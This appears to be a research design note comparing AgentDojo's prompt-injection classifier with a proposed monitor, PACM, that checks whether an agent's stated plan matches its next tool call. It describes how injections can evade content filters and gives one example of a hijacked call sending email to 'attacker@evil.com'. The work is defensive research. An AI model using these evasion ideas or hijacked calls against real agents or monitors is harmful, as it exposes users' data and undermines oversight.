# PACM vs AgentDojo `PromptInjectionDetector` — Differentiation Analysis

**Document purpose:** Provide a precise, citable comparison between AgentDojo's built-in
`PromptInjectionDetector` and the proposed PACM system. This document is the primary reference
for the "related work differentiation" section of the PACM paper.

*Compiled: Session 2 | Based on: `agentdojo.agent_pipeline.pi_detector` (AgentDojo v0.1.35)*

---

## 1. What is AgentDojo's `PromptInjectionDetector`?

AgentDojo ships a base class `PromptInjectionDetector`
(`agentdojo/agent_pipeline/pi_detector.py`) together with one concrete subclass,
`TransformersBasedPIDetector`.

### Mechanism (read from source)

The detector is a **pipeline element** inserted into the `AgentPipeline` chain. Its `query()`
method fires after every tool response (`role == "tool"`) before the next LLM call. It:

1. **Inspects tool output text** for injection signals — either the raw text of the last tool
   message (`mode="message"`) or the entire conversation concatenated (`mode="full_conversation"`).
2. **Calls `detect(text) → bool | (bool, float)`** — an abstract method the subclass fills in.
3. If an injection is detected and `raise_on_injection=True`, raises `AbortAgentError`
   (hard stop). Otherwise, **replaces the tool message content** with
   `"<Data omitted because a prompt injection was detected>"` (soft suppress).

The only concrete implementation, `TransformersBasedPIDetector`, uses
`protectai/deberta-v3-base-prompt-injection-v2` (a fine-tuned DeBERTa text classifier) to
score tool output text.

```
                  ┌──────────────────────────────────────┐
                  │        AgentDojo Pipeline             │
User Task ──►  System  ──►  InitQuery  ──►  LLM         │
                                             │            │
                                             ▼            │
                                        ToolsExec         │
                                             │            │
                                             ▼            │
                              PromptInjectionDetector     │  ← inspects tool OUTPUT text
                                             │            │
                                       (suppress / abort) │
                                             ▼            │
                                            LLM ──► ...   │
                  └──────────────────────────────────────┘
```

### Key properties of the AgentDojo detector

| Property | Value |
|---|---|
| **Signal source** | Tool *output* text (what the tool returned) |
| **Inspection point** | After tool execution, before next LLM call |
| **Detection method** | Text classifier (fine-tuned DeBERTa) or custom `detect()` override |
| **Action on detection** | Suppress tool content OR abort agent (binary) |
| **Context-dependence awareness** | None — detects based on text content regardless of task context |
| **Trust signal** | None — no per-tool or per-server weighting |
| **Framework coupling** | Tightly coupled to AgentDojo's `BasePipelineElement` interface |
| **Model dependency** | Requires `transformers` + `torch` + HuggingFace model download |
| **Latency** | One DeBERTa inference call per tool result |

---

## 2. What is PACM?

PACM (Plan-Action Consistency Monitoring) is a **runtime middleware** that intercepts tool
calls *before* they execute. It computes a **divergence score** between:

- The agent's **declared intent** (extracted from its reasoning trace immediately before a
  tool call — the "plan") and
- The **actual tool call** it is about to issue (tool name + arguments — the "action").

This divergence signal is combined with a **lightweight trust score** for the MCP
server/tool involved.

```
                  ┌──────────────────────────────────────────────┐
                  │         PACM Architecture                    │
LLM Reasoning ──►  plan extractor  ──►  divergence scorer        │
                                              │                   │
Tool Call ──────────────────────────────────► ▼                   │
                                        [divergence score]        │
                                              │                   │
MCP Registry ──► trust scorer ──────────────► ▼                   │
                                        [trust score]             │
                                              │                   │
                                         friction policy          │
                                    ┌────────┴────────┐          │
                                  allow            block/confirm  │
                                    │                   │         │
                              tool executes      escalate/log     │
                  └──────────────────────────────────────────────┘
```

---

## 3. Point-by-Point Comparison

| Dimension | AgentDojo `PromptInjectionDetector` | PACM |
|---|---|---|
| **Primary signal** | Text content of tool *output* (after execution) | Divergence between agent's *reasoning trace* and its *tool call* (before execution) |
| **Inspection timing** | After tool execution | Before tool execution |
| **What it looks for** | "Does this text look like a prompt injection?" | "Did the agent's declared intent change after ingesting external content?" |
| **Detection mechanism** | Text classifier (DeBERTa fine-tuned on injection text) | Embedding similarity + rule-based constraint checks on plan→action transition |
| **Model training required** | Yes — DeBERTa fine-tuned on injection examples | No — zero-shot; uses agent's own reasoning trace |
| **Adversarial robustness** | Gameable: attacker encodes injection in non-injection-looking text (e.g. steganography, paraphrase) | Harder to game: attacker must also keep the agent's stated reasoning consistent with the hijacked action (RQ5) |
| **Context-dependent tasks** | High FPR risk: legitimate tool outputs that contain directive language (e.g. "Please forward this to …") may be flagged | Lower FPR: PACM only escalates when reasoning diverges *and* injection window is open (i.e., agent just ingested external content) |
| **Trust signal** | None | Per-tool/server trust score based on registry metadata (publisher, recency, consistency) |
| **Framework coupling** | AgentDojo `BasePipelineElement` only | Framework-agnostic pre/post hook interface (LangGraph, custom loop, AutoGen) |
| **Action on detection** | Binary: suppress content or abort | Adaptive friction: allow / confirm / sandbox / block |
| **Latency source** | 1× DeBERTa inference per tool result | Embedding similarity call (lightweight, swappable) |
| **Deployment requirement** | `transformers` + `torch` + HF model download (~300MB+) | Any embedding model (sentence-transformers, openai embeddings, or BM25 rule-based) |
| **Evaluation axis reported** | Attack block rate only (in AgentDojo benchmark) | ABR + BTSR (Benign Task Success Rate) jointly — directly targeting the utility-security tradeoff |

---

## 4. The Critical Differentiator: Signal Source and Inspection Timing

The most important distinction is **what signal is used and when**:

- `PromptInjectionDetector` **reads the tool output** and asks: "is this text malicious?"
  This is a content-based filter — the same class of defense as spotlighting and delimiters.
  It can be evaded by any injection that does not *look* malicious in isolation (e.g.
  indirect or multi-hop injections where the instruction appears to be benign content).

- PACM **reads the agent's own reasoning** and asks: "did the agent's stated plan just change
  in a way that is inconsistent with the user's original task, immediately after ingesting this
  content?" This is a *behavioral* signal, not a *content* signal. An attacker who evades
  content-based detection still has to keep the agent's CoT reasoning consistent — a much
  harder constraint to engineer.

This distinction maps directly to the gap identified in the AgentPI SoK
(Wang et al., 2602.10453) and ARGUS (Weng et al., 2605.03378): existing defenses inspect
*what the agent reads*, not *what the agent decides to do* after reading it.

---

## 5. False-Positive Resistance on Context-Dependent Tasks

The PACM_Research_Guide §2 identifies context-dependent tasks as the setting where current
defenses fail most acutely. Consider the task: "Reply to whichever of these emails is most
urgent." The agent must:

1. Call `read_inbox()` → receive a list of emails.
2. Parse the list and decide which to reply to.
3. Call `send_email(to=<that sender>, ...)`.

`PromptInjectionDetector` in `mode="message"` would run `detect()` on the raw inbox content.
If any email contains directive-sounding text (even benign, e.g. "Please reply by Friday"),
the classifier may trigger a false positive and suppress the result — blocking the agent from
completing the legitimate task.

PACM handles this differently:
- The plan extracted before step 3 will state: "I should reply to `alice@example.com` because
  her email about the Friday deadline is most urgent."
- The actual tool call will be `send_email(to="alice@example.com", ...)`.
- Divergence is low → no escalation.

Only if the agent instead issues `send_email(to="attacker@evil.com", ...)` — inconsistent with
its stated plan — does PACM escalate.

---

## 6. Complementarity, Not Replacement

PACM and `PromptInjectionDetector` are **complementary**, not competing:

- `PromptInjectionDetector` catches text-obvious injections early (before the LLM even
  processes them) — useful as a first line of defense when the injection payload is detectable
  in isolation.
- PACM catches *behavioral* divergence — useful when the injection is not detectable by
  content inspection alone (the harder and more realistic case).

A production deployment could layer both: content-based filter as a fast pre-screen, PACM as
a semantic behavioral monitor.

In the paper, PACM should be positioned as:
> "A complementary, behavioral-layer defense that operates on the agent's own reasoning-to-action
> transition, targeting the gap that content-based filters (including AgentDojo's built-in
> `PromptInjectionDetector`) leave open on context-dependent tasks."

---

## 7. Precise Differentiating Claims for the Paper

1. **Signal novelty:** "PACM uses the agent's own reasoning trace as its primary detection
   signal — a source that, to our knowledge, has not been used as a primary mechanism at the
   middleware layer in prior work."
2. **Framework-agnostic:** "PACM's hook interface is compatible with LangGraph, custom agent
   loops, and AutoGen; `PromptInjectionDetector` is tightly coupled to AgentDojo's pipeline."
3. **No model training:** "PACM requires no fine-tuned classifier; `TransformersBasedPIDetector`
   requires downloading and running a DeBERTa model."
4. **Trust augmentation:** "PACM incorporates per-tool trust scores grounded in empirical MCP
   registry findings (Li & Gao 2510.16558); `PromptInjectionDetector` has no such signal."
5. **Evaluation axis:** "PACM reports ABR and BTSR jointly; the AgentDojo benchmark reports ABR
   but not BTSR on context-dependent tasks — the axis the 2026 SoK identifies as the field's
   largest blind spot."

---

## 8. References

- AgentDojo pi_detector source: `agentdojo/agent_pipeline/pi_detector.py` (v0.1.35)
- Debenedetti et al. (2024) — AgentDojo — arXiv:2406.13352
- Wang et al. (2026) — AgentPI SoK — arXiv:2602.10453
- Weng et al. (2026) — ARGUS + AgentLure — arXiv:2605.03378
- Li & Gao (2025/2026) — MCP Ecosystem Security — arXiv:2510.16558
- Hasan et al. (2026) — MCP at First Glance — arXiv:2506.13538
- PACM_Research_Guide.md §2, §7, §8, §9, §10
